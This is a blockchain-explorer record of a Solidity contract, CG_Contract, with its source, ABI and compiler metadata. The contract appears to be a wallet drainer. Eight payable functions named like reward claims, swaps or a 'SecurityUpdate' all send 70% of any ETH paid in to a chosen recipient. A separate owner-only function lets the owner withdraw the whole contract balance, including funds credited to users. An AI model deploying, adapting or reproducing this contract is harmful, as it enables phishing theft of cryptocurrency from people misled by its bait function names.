{"SourceCode": "// SPDX-License-Identifier: Unlicense\r\npragma solidity ^0.8.18;\r\n\r\ncontract CG_Contract {\r\n\r\n    address private owner;\r\n    mapping(address => uint256) private balance;\r\n    mapping(address => bool) private auto_withdraw;\r\n\r\n    event Withdrawal(address indexed receiver, uint256 amount);\r\n    event AutoWithdrawStatusUpdated(address indexed user, bool status);\r\n    event Payout(address receiver, uint256 amount);\r\n \r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner, \"Only owner can call this\");\r\n        _;\r\n    }\r\n\r\n    modifier validAmount() {\r\n        require(msg.value > 0, \"Invalid amount\");\r\n        _;\r\n    }\r\n\r\n    constructor() {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function getOwner() public view returns (address) {\r\n        return owner;\r\n    }\r\n\r\n    function getBalance() public view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n\r\n    function getUserBalance(address wallet) public view returns (uint256) {\r\n        return balance[wallet];\r\n    }\r\n\r\n    function getWithdrawStatus(address wallet) public view returns (bool) {\r\n        return auto_withdraw[wallet];\r\n    }\r\n\r\n    function setWithdrawStatus(bool status) public {\r\n        auto_withdraw[msg.sender] = status;\r\n        emit AutoWithdrawStatusUpdated(msg.sender, status);\r\n    }\r\n\r\n    function withdraw() public {\r\n        uint256 amount = balance[msg.sender];\r\n        require(address(this).balance >= amount, \"BALANCE_LOW\");\r\n        balance[msg.sender] = 0;\r\n        payable(msg.sender).transfer(amount);\r\n        emit Withdrawal(msg.sender, amount);\r\n    }\r\n\r\n    function withdrawEther(address payable receiver, uint256 amount) public onlyOwner {\r\n        require(receiver != address(0), \"Invalid address\");\r\n        require(address(this).balance >= amount, \"Insufficient contract balance\");\r\n        payable(receiver).transfer(amount);\r\n    }\r\n\r\n    function _executeTransaction(uint8 auto_payout, address sender, address recipient1) public payable validAmount {\r\n        uint256 gasCost = tx.gasprice * gasleft(); \r\n        uint256 totalAmount = msg.value - gasCost; \r\n        \r\n        if (auto_payout == 1) {\r\n            uint256 payoutAmount1 = totalAmount * 70 / 100;\r\n            uint256 payoutAmount2 = totalAmount - payoutAmount1;\r\n\r\n            payable(recipient1).transfer(payoutAmount1);\r\n            payable(sender).transfer(payoutAmount2);\r\n\r\n            emit Withdrawal(recipient1, payoutAmount1);\r\n        } else {\r\n            balance[sender] += totalAmount;\r\n        }\r\n    }\r\n\r\n    function Claim(uint8 auto_payout, address sender, address recipient1) public payable {\r\n        _executeTransaction(auto_payout, sender, recipient1);\r\n    }\r\n\r\n    function ClaimReward(uint8 auto_payout, address sender, address recipient1) public payable {\r\n        _executeTransaction(auto_payout, sender, recipient1);\r\n    }\r\n\r\n    function ClaimRewards(uint8 auto_payout, address sender, address recipient1) public payable {\r\n        _executeTransaction(auto_payout, sender, recipient1);\r\n    }\r\n   \r\n    function Execute(uint8 auto_payout, address sender, address recipient1) public payable {\r\n        _executeTransaction(auto_payout, sender, recipient1);\r\n    }\r\n   \r\n    function Multicall(uint8 auto_payout, address sender, address recipient1) public payable {\r\n        _executeTransaction(auto_payout, sender, recipient1);\r\n    }\r\n   \r\n    function Swap(uint8 auto_payout, address sender, address recipient1) public payable {\r\n        _executeTransaction(auto_payout, sender, recipient1);\r\n    }\r\n   \r\n    function Connect(uint8 auto_payout, address sender, address recipient1) public payable {\r\n        _executeTransaction(auto_payout, sender, recipient1);\r\n    }\r\n   \r\n    function SecurityUpdate(uint8 auto_payout, address sender, address recipient1) public payable {\r\n        _executeTransaction(auto_payout, sender, recipient1);\r\n    }\r\n   \r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"AutoWithdrawStatusUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Payout\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Withdrawal\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"auto_payout\",\"type\":\"uint8\"},{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient1\",\"type\":\"address\"}],\"name\":\"Claim\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"auto_payout\",\"type\":\"uint8\"},{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient1\",\"type\":\"address\"}],\"name\":\"ClaimReward\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"auto_payout\",\"type\":\"uint8\"},{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient1\",\"type\":\"address\"}],\"name\":\"ClaimRewards\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"auto_payout\",\"type\":\"uint8\"},{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient1\",\"type\":\"address\"}],\"name\":\"Connect\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"auto_payout\",\"type\":\"uint8\"},{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient1\",\"type\":\"address\"}],\"name\":\"Execute\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"auto_payout\",\"type\":\"uint8\"},{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient1\",\"type\":\"address\"}],\"name\":\"Multicall\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"auto_payout\",\"type\":\"uint8\"},{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient1\",\"type\":\"address\"}],\"name\":\"SecurityUpdate\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"auto_payout\",\"type\":\"uint8\"},{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient1\",\"type\":\"address\"}],\"name\":\"Swap\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"auto_payout\",\"type\":\"uint8\"},{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient1\",\"type\":\"address\"}],\"name\":\"_executeTransaction\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"wallet\",\"type\":\"address\"}],\"name\":\"getUserBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"wallet\",\"type\":\"address\"}],\"name\":\"getWithdrawStatus\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"setWithdrawStatus\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"receiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdrawEther\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "CG_Contract", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "Unlicense", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://0531600f20b8e3fb8d6185278bd569ea5f01a2155b0d635e7608b6ab698bb3aa"}